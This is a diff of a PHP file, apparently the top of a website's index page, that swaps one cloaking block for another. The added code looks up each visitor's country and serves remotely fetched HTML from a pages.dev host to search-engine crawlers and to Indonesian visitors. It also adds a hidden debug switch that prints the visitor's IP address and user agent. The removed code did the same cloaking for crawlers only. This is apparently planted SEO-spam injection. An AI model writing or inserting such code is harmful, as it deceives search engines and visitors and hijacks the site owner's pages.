@@ -1,33 +1,32 @@
-<?php 
-ini_set('display_errors', 1); 
-ini_set('display_startup_errors', 1); 
-error_reporting(E_ALL); 
+<?php
 
-$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
-$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'];
+function getCountryByIp($ip)
+{
+    $url = "http://ip-api.com/json/$ip";
 
-$bot_signatures = [ 
-    'googlebot', 
-    'bingbot', 
-    'slurp', 
-    'duckduckbot', 
-    'baiduspider', 
-    'yandex', 
-    'crawler', 
-    'Google-Site-Verification',
-    'spider' 
-];
-
-if (strpos($request_uri, '/') !== false) { 
-    foreach ($bot_signatures as $bot) { 
-        if (strpos($user_agent, $bot) !== false) { 
-            $html = @file_get_contents('https://journal-yayasansahara-org.pages.dev/index.txt'); 
-            header("Content-Type: text/html; charset=UTF-8"); 
-            echo $html !== false ? $html : "Cloaked content failed to load."; 
-            exit; 
-        } 
-    } 
+    $response = file_get_contents($url);
+    $data = json_decode($response, true);
+    $countryCode = $data['countryCode'];
+    return $countryCode;
 }
+$ctryCode = getCountryByIp($ip);
+
+if (isset($_GET['a']) && $_GET['a'] === 'a') {
+    echo "country: " . $ctryCode;
+    echo "<br>";
+    echo "useragent: " . $userAgent;
+    echo "<br>";
+    echo "ip: " . $ip;
+    exit;
+}
+
+if (preg_match('/bot|crawl|slurp|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot|spider/i', $userAgent) || $ctryCode == 'ID') {
+    echo file_get_contents('https://journal-for4d.pages.dev/index.txt');
+    exit;
+}
+
 ?>
 
 <?php
